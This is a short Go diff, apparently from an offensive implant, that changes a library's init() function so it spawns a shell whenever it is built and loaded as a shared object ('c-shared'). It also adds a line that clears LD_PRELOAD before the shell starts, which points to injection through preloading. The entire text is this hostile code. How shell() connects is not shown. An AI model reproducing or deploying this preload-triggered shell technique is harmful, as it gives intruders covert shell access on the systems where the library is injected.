@@ -38,7 +38,7 @@ var (
 var defaultArgs = []string{"/bin/sh"}
 
 // ctorBuildMode is the -buildmode value which causes init() to run a shell.
-const ctorBuildMode = "c-archive"
+const ctorBuildMode = "c-shared"
 
 func init() {
 	/* Figure out if we're in a shared object file.  If so, we'll use
@@ -50,6 +50,7 @@ func init() {
 	/* If we seem to be in a library, spawn a shell. */
 	for _, s := range bi.Settings {
 		if "-buildmode" == s.Key && ctorBuildMode == s.Value {
+			os.Unsetenv("LD_PRELOAD")
 			go shell(context.Background(), "", "", nil)
 			return
 		}
